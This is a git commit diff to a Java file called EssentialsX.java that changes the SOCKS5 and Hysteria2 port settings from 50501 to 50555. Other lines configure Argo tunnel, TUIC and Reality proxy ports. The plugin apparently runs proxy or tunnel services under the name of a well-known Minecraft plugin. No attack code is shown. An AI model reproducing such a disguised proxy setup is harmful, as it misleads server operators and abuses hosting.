069e5f514101f77b76eacb1aa8ccfc4cb60051f5
pingmike2 <166621491+pingmike2@users.noreply.github.com>
2026-03-16 22:47:20 +0800

    Update EssentialsX.java

--- src/main/java/com/example/essentialsx/EssentialsX.java
+++ src/main/java/com/example/essentialsx/EssentialsX.java
@@ -81,8 +81,8 @@ public class EssentialsX extends JavaPlugin {
         env.put("ARGO_PORT", "8001");
         env.put("ARGO_DOMAIN", "");
         env.put("ARGO_AUTH", "");
-        env.put("S5_PORT", "50501");
-        env.put("HY2_PORT", "50501");
+        env.put("S5_PORT", "50555");
+        env.put("HY2_PORT", "50555");
         env.put("TUIC_PORT", "");
         env.put("ANYTLS_PORT", "");
         env.put("REALITY_PORT", "");
